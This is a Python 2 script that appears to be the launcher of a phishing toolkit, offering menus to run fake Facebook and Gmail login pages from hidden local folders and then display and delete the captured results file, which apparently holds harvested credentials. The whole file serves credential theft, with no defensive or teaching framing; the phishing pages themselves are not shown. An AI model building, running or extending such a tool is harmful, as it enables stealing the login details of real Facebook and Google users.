import os
import sys
import time
from termcolor import colored

def methods():
     print(colored("""
====================================
>>HOW YOU WANT TO PHISHING CHOOSE<<
====================================
1. LocalHost
2. Wan
3. Exit
""", "red"))

def Facebook():
	fbanner()
	
def Gmail():
    gmailb()

def FacebookA():
	fbab()
    
def fbanner():
	print methods()
	fbanner = raw_input("stark > ")
	if fbanner == "1":
	     try:
		os.system("cd .web/fb_standard && ./fbs")
	     except KeyboardInterrupt:
		print(colored("are you want to check result", 'green'))
		os.system("cat .web/fb_standard/cat.txt && rm -rf .web/fb_standard/cat.txt")
		time.sleep(6)
		sys.exit()
	elif fbanner == "2":
		print(colored("SORRY THIS TOOL WORKING ON IT", 'red'))
		time.sleep(5)
		sys.exit()
		
	elif fbanner == "3":
		sys.exit()
		
def gmailb():
	print methods()
	gmailb = raw_input("stark > ")
	if gmailb == "1":
	     try:
	        os.system("cd .web/google_standard && ./gs")
	     except KeyboardInterrupt:
	        print(colored("are you want to check result", 'green'))
	        os.system("cat .web/google_standard/cat.txt && rm -rf .web/google_standard/cat.txt")
	        time.sleep(6)
	        sys.exit()
	elif gmailb == "2":
		print(colored("SORRY THIS TOOL WORKING ON IT", 'red'))
		time.sleep(5)
		sys.exit()
		
	elif gmailb == "3":
		sys.exit()
		
def fbab():
	print methods()
	fbab = raw_input("stark > ")
	if fbab == "1":
		try:
		   os.system("cd .web/fb_advanced_poll && ./fba")
		except KeyboardInterrupt:
			print(colored("are you want to check results", 'green'))
			os.system("cat .web/fb_advanced_poll/cat.txt && rm -rf .web/fb_advanced_poll/cat.txt")
			time.sleep(6)
			sys.exit()
	elif fbab == "2":
		print(colored("SORRY THIS TOOL WORKING ON IT", 'red'))
		time.sleep(5)
		sys.exit()
		
	elif fbab == "3":
		sys.exit()

def Update():
	os.system("git pull")
	restartprogram()

def restartprogram():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()
